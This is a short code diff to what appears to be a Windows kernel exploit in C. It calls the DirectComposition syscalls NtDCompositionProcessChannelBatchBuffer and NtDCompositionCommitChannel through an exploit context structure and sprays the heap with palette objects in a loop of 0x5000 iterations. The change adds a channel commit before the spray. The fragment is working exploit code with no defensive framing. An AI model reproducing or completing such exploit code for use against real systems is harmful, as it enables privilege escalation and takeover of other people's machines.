@@ -625,7 +625,11 @@ int main(int argc, TCHAR* argv[]) {
     *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
 
+    DWORD out1;
+    DWORD out2;
+    BOOL in1 = FALSE;
 
+    NtDCompositionCommitChannel(hChannel, &out1, &out2, in1, NULL);
     for (size_t i = 0; i < 0x5000; i++)
     {
         createPaletteofSize1(g_pExploitCtx->ObjectSize);
@@ -660,7 +664,6 @@ int main(int argc, TCHAR* argv[]) {
             printf("error!\n");
             return 0;
         }
-
 
         NtDCompositionCommitChannel(hChannel, &dwArg1, &dwArg2, 0, p);
 
